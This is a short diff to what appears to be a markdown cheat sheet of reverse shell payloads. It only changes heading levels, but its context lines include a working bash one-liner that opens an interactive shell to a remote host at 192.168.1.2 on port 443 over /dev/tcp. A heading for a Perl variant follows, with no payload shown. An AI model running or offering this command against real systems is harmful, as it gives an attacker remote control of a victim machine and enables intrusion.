@@ -1,6 +1,6 @@
-## Reverse Shell (Netcat Listener)
+# Reverse Shell (Netcat Listener)
 
-## Bash
+# Bash
 bash -i >& /dev/tcp/192.168.1.2/443 0>&1
 
 ## Perl
